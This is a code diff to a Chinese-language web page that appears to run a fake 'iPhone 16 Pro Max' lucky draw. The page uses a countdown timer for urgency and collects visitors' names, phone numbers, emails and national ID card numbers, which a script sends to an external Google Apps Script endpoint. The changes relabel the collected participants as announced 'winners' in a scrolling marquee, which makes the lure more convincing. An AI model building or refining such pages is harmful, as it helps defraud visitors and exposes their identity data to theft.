@@ -120,7 +120,7 @@
       <div class="phone-image">📱<br>iPhone 16<br>Pro Max</div>
       <p style="color: #ff6b35; font-size: 1.2em;">⚡ 限時優惠！僅剩 <span id="timer">05:00</span> 分鐘！</p>
       <button class="lucky-button" onclick="clickLucky()">🎁 立即點擊抽獎！</button>
-      <div class="click-counter">已有 <span id="clickCount">0</span> 人參與抽獎！</div>
+      <div class="click-counter" id="participantCount">已有 0 人參與抽獎！</div>
     </div>
 
     <div class="marquee-container">
@@ -164,12 +164,7 @@
   <script>
     const scriptUrl = 'https://script.google.com/macros/s/AKfycbyzQvZYUjfXpIOunFdlR4YZoo5eMWG0iV7mZKb00Eg_OxqTGeTdIssJpHx-GuKxcEE0vw/exec';
 
-    let clickCount = 0;
-    let participants = [];
-
     function clickLucky() {
-      clickCount++;
-      document.getElementById('clickCount').textContent = clickCount;
       document.getElementById('homepage').style.display = 'none';
       document.getElementById('formPage').style.display = 'block';
     }
@@ -200,8 +195,6 @@
       const email = document.getElementById('email').value;
       const idcard = document.getElementById('idcard').value;
 
-      participants.push({ name, phone, email, idcard });
-
       const params = new URLSearchParams({ name, phone, email, idcard });
 
       try {
@@ -218,13 +211,15 @@
 
     async function updateMarquee() {
       const marquee = document.getElementById('marqueeText');
+      const countDisplay = document.getElementById('participantCount');
       try {
         const response = await fetch(`${scriptUrl}?mode=winners`);
         const result = await response.json();
         const { count, winners } = result;
+        if (countDisplay) countDisplay.textContent = `已有 ${count} 人參與抽獎！`;
         if (count > 0) {
           const list = winners.join('、');
-          marquee.textContent = `🎉 ${list} 等 ${count} 位朋友參與抽獎，感謝您的參與！`;
+          marquee.textContent = `🎉 恭喜以下 ${winners.length} 位中獎者：${list}`;
         } else {
           marquee.textContent = `🎉 尚無中獎名單，快來試試手氣！`;
         }
